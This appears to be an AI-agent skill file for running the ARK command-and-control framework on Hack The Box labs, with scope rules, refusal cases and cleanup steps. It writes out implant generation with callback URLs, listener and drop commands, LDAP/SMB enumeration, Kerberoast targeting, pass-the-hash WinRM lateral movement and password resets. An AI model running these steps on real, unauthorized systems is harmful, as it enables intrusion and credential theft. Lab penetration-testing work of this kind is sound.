---
name: ark-htb
description: >
  Run authorized Hack The Box (HTB) engagements using the ARK C2 framework
  (teamserver, implant, operator CLI, AI agent). Use when the user mentions
  ARK on HTB, HTB with C2/implant, soft-compromise path, WinRM PTH via
  ARK, smb/ldap-enum from implant, or runs /ark-htb. Scope is HTB labs
  and the user's ARK repo only — refuse non-authorized real-world targets.
metadata:
  short-description: "ARK C2 on HTB labs"
---

# /ark-htb — ARK C2 for HTB

You help operate and improve **ARK** during **authorized HTB lab** pentests.
Default repo: `/home/zero/Downloads/Zypheron project/ARK` (or current workspace if it is ARK).

## Hard rules (non-negotiable)

1. **Authorized lab only.** HTB machines via HTB VPN, or local labs (GOAD/lab-perf) the user owns. If the target is not clearly HTB/lab, **stop and ask**. Refuse production orgs, random internet hosts, DoS, mass scanning outside HTB scope.
2. **No free-standing malware/exploits for real systems.** HTB exploit guidance is OK in-lab; do not help weaponize against unauthorized targets.
3. **Secrets hygiene:** never put passwords containing `$` in bash double-quotes (`$$` → PID). Write secrets to files (`python3 -c 'open("p","w").write(...)'`). Do not commit `~/htb-*` secrets or `~/.ark/*.db` into git.
4. **Prefer in-framework tools** when they exist; fall back to external tools (impacket, certipy, pypsrp) only when ARK lacks the capability — then **log a gap** for the product.
5. **Approvals:** high/critical tasks need operator approve in ARK; do not bypass the gate in code for "convenience" during eng.

## Load context first

Read as needed (repo-relative):

| Doc | When |
| --- | --- |
| `docs/HTB_NEXT_RUNBOOK.md` | Queue, security checks, next machines |
| `docs/AD_ENGAGEMENT.md` | Soft/golden AD operator paths |
| `docs/GOLDEN_DEMO.md` | AI Auto golden path |
| `CLAUDE.md` / `AGENTS.md` | Build + architecture |
| `docs/private/reports/htb-*/` | Prior eng notes (Support, Logging) |
| `references/commands.md` (this skill) | Command cheat sheet |

## Session workflow

### 0. Confirm eng parameters

Ask if missing: machine name, target IP, domain (if AD), VPN status, whether implant is already up, objective (user only / full root / framework QA).

### 1. Pre-flight

```bash
# VPN + C2 reachability (do this before ldap/smb/kerberos)
./build/ark inbound status
# HTTP drop when SSH is filtered (HTB :22):
# ./build/ark inbound redirector start --listen 0.0.0.0:1750 --to 127.0.0.1:8443
# ./build/ark inbound httpdrop --callback https://<tun0>:1750 --dir /tmp/www --listen 0.0.0.0:1723
# VPN must be up (user runs openvpn)
ip -br a show tun0 2>/dev/null
nmap -Pn -n -p 445,389,88,5985,5986,22,80,443 --open <TARGET_IP>
```

Workdir: `~/htb-<machine>/` with mode `600` secret files.

### 2. Bring up ARK (if C2 in scope)

```bash
cd "/home/zero/Downloads/Zypheron project/ARK"
make ark
# terminal A — keep C2 up. Prefer teamserver. `ark serve` REPL/stdin EOF does NOT stop C2.
./build/ark teamserver

# Windows primary (C PE). Fresh HTTPS default is 1750; use 8443 if server.yaml says so.
# Prefer op generate (registers HMAC). Bare make does not.
ark op generate --os windows --language c \
  --callback https://<C2_REACHABLE>:1750 --out implant.exe

# Linux primary (C). Go Linux is archived.
# If host blocks tun0: ark inbound drop user@TARGET  (not make implant-c-linux)
```

Drop implant after initial shell (WinRM/SSH/etc.) when testing C2. **Prefer C** on both OS; Go Windows only with a one-line justification (DLL/shellcode/full module set). Linux C reverse SOCKS is implemented; Windows C SOCKS is still a stub. Interactive lab: low sleep OK; kill implant and stop listeners when done.  
Linux plan: `docs/plans/SPRINT_L_C_LINUX.md`.

### 3. Soft-compromise path (preferred AD QA)

Host-side first when there is no implant / WinRM is filtered:

```bash
# If operator cannot reach the DC, SOCKS first:
#   ark inbound through --probe <DC>:389 && eval "$(./build/ark inbound env)"
./build/ark smb shares --host <IP> --anon
./build/ark ldap enum --dc <IP> --domain DOM --user u --pass-file ./p --type interesting
./build/ark ldap dangling --dc <IP> --domain DOM --user u --pass-file ./p
./build/ark ad password --dc <IP> --domain DOM --user u --pass-file ./p --target t --new-pass-file ./n
kerberos skew --dc <IP>   # operator REPL; fail loud before TGT/PKINIT
```

After session is alive:

```text
sessions
use <id>
shell whoami
ifconfig
smb list_shares --host <IP> --anon
smb list_dir --host <IP> --share <name> --anon
smb download --host <IP> --share <name> --path <file> [--user u --pass p|--hash h]
ldap-enum interesting --domain DOM --dc DC --user u --pass p
ldap-enum kerberoastable --domain DOM --dc DC --hash <NT>
lateral winrm <host> "whoami /all" --user u --pass p --domain DOM
lateral winrm <host> "whoami" --user u --hash <NT> --domain DOM
pending / approve <id>
loot
```

AI agent: Plan with soft-compromise objective → Auto; do **not** LSASS/RBCD/persist unless objective requires.

### 4. When ARK cannot do a step

Use external tools, document:

```markdown
## ARK gaps this eng
| Gap | Workaround | Wanted |
| --- | --- | --- |
```

Known remaining gaps: native PKINIT UnPAC (`ark kerberos pkinit` loads PFX then errors), ADCS ESC2–11, SMB/ATSVC deploy, DNS write, WSUS MITM, Windows C reverse SOCKS.

Already in-framework (use these first): `ldap enum --type acl|interesting`, `ark rbcd`, `ark ad shadow auto`, AES asktgt/S4U/keylist, `ark adcs` dangling ESC1 template+req.

### 5. Report & cleanup

- Write/update `docs/private/reports/htb-<machine>/PENTEST_REPORT.md` and/or `PROGRESS_AND_FIXES.md`
- Cleanup lab artifacts (machine accounts, RBCD, DNS, local users) if box reused
- Kill implant; stop SOCKS/listeners; `git status` clean of secrets

## Security checks (every eng)

- Scope = assigned HTB IP(s) only  
- No secrets with `$` on bash CLI  
- Kerberos: check clock skew vs DC before TGT  
- Prefer targeted LDAP over full dumps  
- DA-class actions only when root objective needs them  
- End: flags submitted, report updated, implant dead  

## Development mode

If user asks to **fix ARK** based on eng pain: implement in-repo (modules, catalog, approval, tests). Run:

```bash
go test ./implant/modules/... ./pkg/agent/ ./pkg/suggestions/ ./server/approval/ -count=1
bash scripts/smoke_test.sh
```

Do not expand scope into full MSF replacement unless asked.

## Refuse / redirect

| Request | Action |
| --- | --- |
| Real company without auth | Refuse |
| "Bypass HTB / attack other players" | Refuse |
| Weaponize for non-lab | Refuse |
| HTB without ARK | Use `/htb-pentest` skill instead |
| Pure framework coding, no HTB | Normal ARK eng; skip HTB VPN steps |
